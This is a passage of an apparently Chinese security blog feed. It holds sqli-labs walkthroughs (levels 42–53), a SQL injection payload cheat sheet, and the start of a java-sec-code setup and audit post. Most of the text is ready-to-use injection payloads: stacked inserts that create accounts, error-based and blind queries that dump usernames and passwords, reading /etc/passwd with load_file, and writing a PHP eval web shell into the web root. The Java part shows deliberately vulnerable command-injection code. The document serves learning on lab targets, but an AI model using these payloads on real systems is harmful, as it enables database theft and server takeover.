class="hljs routeros"><span class="hljs-attribute">login_user</span>=1&amp;login_password=1&#x27;;insert into users(id,username,password) values (<span class="hljs-string">&#x27;39&#x27;</span>,<span class="hljs-string">&#x27;less30&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>)--+&amp;<span class="hljs-attribute">mysubmit</span>=Login<br>将<span class="hljs-attribute">id</span>=39<br>账号：less30<br>密码：123456<br></code></pre></td></tr></table></figure></li></ul><h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201252794.png" alt="image-20250307152806286"></p><p>为单引号+括号</p></li><li><pre><code class="hljs">login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login将id=39账号：less30密码：123456<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  <br><br><span class="hljs-section">## 44</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 测试<br><br></code></pre></td></tr></table></figure>单引号测试成功login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--将id=39账号：less30密码：123456<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 45</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 测试<br><br>  单引号测试不成功<br><br></code></pre></td></tr></table></figure>单引号+括号 测试成功login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--将id=39账号：less30密码：123456<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 46</span><br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250307153359198</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201255223.png</span>)<br><br>  根据提示输入<span class="hljs-strong">**？sort=1**</span><br><br><span class="hljs-bullet">-</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201257029.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image-20250307153423526&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;zoom: 25%;&quot;</span> /&gt;</span></span><br><br><span class="hljs-bullet">-</span> 出现表格<br><br><span class="hljs-bullet">-</span> 寻找闭合<br><br>  <span class="hljs-strong">**数字型**</span><br><br><span class="hljs-bullet">-</span> 报错注入<br><br></code></pre></td></tr></table></figure>?sort=1 and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>  <br><br>## <span class="hljs-number">47</span><br><br>- 同上<br><br>  闭合为单引号<br><br></code></pre></td></tr></table></figure>?sort=1&#39; and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 48（order by 下的布尔/时间）</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 布尔/时间<br><br>  布尔<br><br></code></pre></td></tr></table></figure>?sort=rand((ascii(mid((select database()),1,1)))&gt;65)sord=rand and length(database())&gt;7#（猜数据库长度）sord=rand and ascii(substr(database(),1,1))&gt;114#（猜数据库名字）sord=rand and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#（猜表名长度）sord=rand and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）sord=rand and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#（猜列名长度）sord=rand and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）sord=rand and length((select password from users limit 0,1))&gt;3#（猜数据长度）sord=rand and ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>时间：<br><br></code></pre></td></tr></table></figure>?sort=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+判断数据库名长度 ?sort=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+逐一判断数据库字符?sort=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+判断所有表名长度 ?sort=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+逐一判断表名?sort=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+判断所有字段名的长度?sort=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+逐一判断字段名。?sort=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+判断字段内容长度 ?sort=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+逐一检测内容。<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 49</span><br><br>- 单引号闭合，无报错，同理，，时间盲注,布尔盲注<br><br>  **布尔盲注在order by**<br><br>  **?<span class="hljs-attribute">sort</span>=<span class="hljs-string">&#x27;| rand(1=2)--+**</span><br><span class="hljs-string"></span><br><span class="hljs-string">  使用时间盲注</span><br><span class="hljs-string"></span><br><span class="hljs-string">- ```</span><br><span class="hljs-string">  ?sort=1&#x27;</span>and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>  判断数据库名长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>  逐一判断数据库字符<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>  判断所有表名长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>  逐一判断表名<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>  判断所有字段名的长度<br>  <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>  逐一判断字段名。<br>  ?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>  判断字段内容长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>  逐一检测内容。<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="50-堆叠排序注入"><a href="#50-堆叠排序注入" class="headerlink" title="50(堆叠排序注入)"></a>50(堆叠排序注入)</h2><p>堆叠&#x2F;报错&#x2F;盲注</p><ul><li><p>有报错+数字类型</p></li><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><pre><code class="hljs">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+知道了账户和密码<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 51</span><br><br>堆叠/报错/盲注<br><br>- 有报错+单引号类型<br><br>- 存在 <span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))---&gt;堆叠注入<br><br>- ```<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;;insert into users(id,username,password) values(<span class="hljs-string">&#x27;41&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  知道了账户和密码<br>  <br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>堆叠&#x2F;盲注</p><p>无报错+数字型</p><ul><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><pre><code class="hljs">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+知道了账户和密码<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 53</span><br><br>堆叠/盲注<br><br>无报错+单引号<br><br>- 存在 <span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))---&gt;堆叠注入<br><br>- ```<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;;insert into users(id,username,password) values(<span class="hljs-string">&#x27;41&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  知道了账户和密码<br>  <br></code></pre></td></tr></table></figure></code></pre></li></ul><h1 id="总结（精华）"><a href="#总结（精华）" class="headerlink" title="总结（精华）"></a>总结（精华）</h1><p>sql注入的诸多payoad利用 </p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="一、union联合查询注入"><a href="#一、union联合查询注入" class="headerlink" title="一、union联合查询注入"></a>一、union联合查询注入</h2><p>常用函数</p><p>information_schema.tables#information_schema下面的所有表名<br>information_schema.columns#information_schema下面所有的列名<br>table_name#表名<br>column_name#列名<br>table_schema#数据库名<br>information_schema进行跨库攻击</p><h3 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h3><p>?id&#x3D;-1 union select 1,database() –+</p><p>1、获取到所有的数据库名称</p><p>?id&#x3D;-2 union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>2、指定获取book库中的表名信息</p><p>?id&#x3D;-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’–+<br>3、获取指定数据库security下的users表的列名信息</p><p>?id&#x3D;-2’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’–+<br>4、查询到指定数据</p><p>?id&#x3D;-2 union select book_id,book_title,book_author from book.book limit 0,1——z–+<br>?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users  ——全部</p><h3 id="文件读写函数注入"><a href="#文件读写函数注入" class="headerlink" title="文件读写函数注入"></a>文件读写函数注入</h3><p>load_file 文件读取</p><p> into outfile 或into dumpfile 文件写入</p><p>?id&#x3D;-2 union select 1,load_file(‘&#x2F;etc&#x2F;passwd’),3<br>?id&#x3D;-2’ union select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3–+<br>?id&#x3D;-2’union select 1,’<?php @eval($_POST["chuan"]);?>‘,3 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;chuan.php’ –+</p><h2 id="二、报错盲注"><a href="#二、报错盲注" class="headerlink" title="二、报错盲注"></a>二、报错盲注</h2><h3 id="报错注入所利用函数"><a href="#报错注入所利用函数" class="headerlink" title="报错注入所利用函数"></a>报错注入所利用函数</h3><p>updatexml  extractvalue  floor</p><h4 id="‌updatexml‌函数的基本语法："><a href="#‌updatexml‌函数的基本语法：" class="headerlink" title="‌updatexml‌函数的基本语法："></a>‌updatexml‌函数的基本语法：</h4><p>updatexml(xml_document, XPath_string, new_value)<br>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p><h4 id="extractvalue‌函数的基本语法："><a href="#extractvalue‌函数的基本语法：" class="headerlink" title="extractvalue‌函数的基本语法："></a>extractvalue‌函数的基本语法：</h4><p>extractvalue(xml_frag, xpath_expr)<br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>用于返回小于或等于一个给定数字的最大整数。在SQL注入中，利用 floor() 函数可以构造报错注入。它通常和 group by 以及 count(*) 等函数一起使用来触发数据库报错，从而获取敏感信息。</p><p>报错语句</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,0x7e,username,0x3a,password) from security.users))) #</p><pre><code class="hljs">使用substring截断?id=1&#39; and extractvalue(1,concat(0x7e, (select substring((select group_concat(id,0x7e,flag) from ctf.flags),1,1000) )))--+</code></pre><h3 id="1、updatexml-payload示例"><a href="#1、updatexml-payload示例" class="headerlink" title="1、updatexml payload示例"></a>1、updatexml payload示例</h3><p>1、爆数据库版本信息<br>k’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)%23<br>k写啥都可以，0x7e是16进制，表示字符‘~’。<br>selecty<br>2、爆数据库当前用户<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select user()),0x7e),1)–+</p><p>3、爆数据库</p><ul><li>所有<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)–+</li><li>当前<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</li></ul><p>4、爆表<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),1)–+<br>更改limit后面的数字limit 0完成表名遍历(即在查询网址上面修改来一个一个查看）。</p><p>使用group_concat(table_name)一次性查询出所有的表名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p><p>5、获取users表的字段名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1)–+</p><p>6、获取users表的内容<br>id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)–+</p><h3 id="2、extractvalue-payload"><a href="#2、extractvalue-payload" class="headerlink" title="2、extractvalue payload"></a>2、extractvalue payload</h3><p>payload<br>1’ and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</p><h3 id="3、floor函数"><a href="#3、floor函数" class="headerlink" title="3、floor函数"></a>3、floor函数</h3><p>判断是否存在报错注入<br>id&#x3D;1’ union select #添加count(<em>)可以增加列数 count(</em>),floor(rand(0)*2) x from information_schema.schemata group by x#</p><p>爆出当前数据库名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</p><p>爆出表<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p><p>爆出字段名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p><p>爆出user和password<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#</p><h3 id="严格过滤"><a href="#严格过滤" class="headerlink" title="严格过滤"></a>严格过滤</h3><p>逻辑运算符，注释符以及空格<br>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’))),1))||’0   爆表</p><p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;’security’aandnd(table_name&#x3D;’users’)))),1))||’0     爆字段</p><p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||’0   爆密码账户</p><h2 id="三、其余注入"><a href="#三、其余注入" class="headerlink" title="三、其余注入"></a>三、其余注入</h2><h3 id="1、加解密注入"><a href="#1、加解密注入" class="headerlink" title="1、加解密注入"></a>1、加解密注入</h3><p>抓取cookie数据包</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">GET /Less<span class="hljs-number">-21</span>/index.php HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.133</span><br>User-Agent<span class="hljs-punctuation">:</span> Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv<span class="hljs-punctuation">:</span><span class="hljs-number">83.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">83.0</span><br>Accept<span class="hljs-punctuation">:</span> text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml;q=<span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span>image/webp<span class="hljs-punctuation">,</span>*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Cookie: uname=YWRtaW4%3D</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br></code></pre></td></tr></table></figure><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器</p><p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;</p><p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;</p><h3 id="2、二次注入"><a href="#2、二次注入" class="headerlink" title="2、二次注入"></a>2、二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。</p><p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p><h3 id="3、dnslog注入"><a href="#3、dnslog注入" class="headerlink" title="3、dnslog注入"></a>3、dnslog注入</h3><p>涉及资源：<a href="http://ceye.io/">http://ceye.io</a></p><p>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p>使用DnsLog盲注仅限于windos环境。</p><h3 id="4、中转注入"><a href="#4、中转注入" class="headerlink" title="4、中转注入"></a>4、中转注入</h3><p>中转一个网站，利用网站进行数据集中改变</p><h3 id="5、堆叠查询注入"><a href="#5、堆叠查询注入" class="headerlink" title="5、堆叠查询注入"></a>5、堆叠查询注入</h3><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>简单payload</p><p><a href="http://10.1.1.133/Less-38/index.php?id=1">http://10.1.1.133/Less-38/index.php?id=1</a> ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+<br>查询数据库</p><p>1’;show databases;–+<br>查表</p><p>?inject&#x3D;1’;show tables–+<br>查列</p><p>1’; show columns from <code>words</code>– q<br>修改操作</p><p>1’;rename table words to word2;rename table <code>1919810931114514</code> to words;ALTER TABLE words ADD id int(10) DEFAULT ‘12’;ALTER TABLE  words CHANGE flag data VARCHAR(100);– q</p>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code-master搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/java-sec-code-master%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/java-sec-code-master%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-master搭建"><a href="#java-sec-code-master搭建" class="headerlink" title="java-sec-code-master搭建"></a>java-sec-code-master搭建</h1><h2 id="源码地址："><a href="#源码地址：" class="headerlink" title="源码地址："></a>源码地址：</h2><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><h2 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h2><p>IDEA</p><p>apache-maven-3.9.1</p><p>apache-tomcat-9.0.105</p><p>JDK 1.8</p><p>MySQL 5.7.26</p><p>数据库：小皮面板自带的MySQL，导入sql文件</p><ol><li><p>在项目结构里面，然后填上你的jdk1.8的bin目录</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193038076.png" alt="image-20250827162302231"></p></li><li><p>直接创建数据库</p><p>我使用的是phpstudy</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193041520.png" alt="image-20250827162426689"></p></li><li><p>然后把 <code>create_db.sql</code>文件的连接数据库的好密码改为自己的</p><p>（记得到导入数据库配置文件    <code>create_db.sql</code>）</p></li><li><p>然后配置一下tomcat</p><p>去官网下载tomcat，解压出来就是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193044839.png" alt="image-20250827162630334"></p></li><li><p>然后在设置里的这个地方添加这个 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193049362.png" alt="image-20250827162731912"></p></li><li><p>maven使用IDEA自带就行</p><p>（也可以自己下载）</p><p>和之前一样，使用 IDEA 打开项目，执行 <code>mvn clean install</code>，然后运行主类即可启动。</p><p>运行application.java（成功后会显示这个）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193055028.png" alt="image-20250827163223030"></p></li><li><p>运行成功之后，下次直接使用这个就可以启动啦</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193059050.png" alt="image-20250827163153762"></p></li><li><p>直接登录就好了</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193154913.png" alt="image-20250827163341209"></p></li></ol><h1 id="java-sec-code-master审计"><a href="#java-sec-code-master审计" class="headerlink" title="java-sec-code-master审计"></a>java-sec-code-master审计</h1><p>使用IDEA搭建了java-sec-code-master</p><p>（使用时，要打开phpstudy运行mysql）</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>src\main\java\org\joychou\controller\CommandInject.java</p><ol><li><p>存在三个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br><span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="hljs-comment">//codeinject/sec是安全方法（其它两个存在漏洞）</span><br></code></pre></td></tr></table></figure></li><li><ul><li><p>&#x2F;codeInject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInject</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;cmd&quot;, &quot;-c&quot;, &quot;dir -la &quot; + filepath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir  &quot;</span> + filepath&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span 